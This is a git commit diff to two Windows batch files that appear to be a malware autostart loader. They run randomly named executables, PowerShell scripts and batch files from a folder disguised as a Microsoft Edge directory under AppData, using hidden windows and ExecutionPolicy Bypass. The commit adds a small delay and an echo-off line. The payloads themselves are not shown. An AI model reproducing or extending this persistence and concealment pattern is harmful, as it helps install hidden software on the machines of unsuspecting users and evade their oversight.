d8c284d6b49d5726eb7a3862544d38cfc318d4ce
Mirozo <82079025+MirozoPL@users.noreply.github.com>
2022-12-18 22:55:50 +0100

    9

--- autostarting.bat
+++ autostarting.bat
@@ -1,4 +1,5 @@
 @ECHO OFF
 cd "%userprofile%\AppData\Local\MicrosoftEdge\404eb8b50ea0d5d6"
 start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'ygoLa8SyqmQTGsoh.exe'
+ping localhost -n 1 > nul
 powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File "./LhFDtKhHgdiXDSt3.ps1"
--- hi.bat
+++ hi.bat
@@ -1,1 +1,2 @@
+@echo off
 start /b "" "%LocalAppData%\MicrosoftEdge\404eb8b50ea0d5d6\oPNUennj8FXKrOBhUURQ.bat"
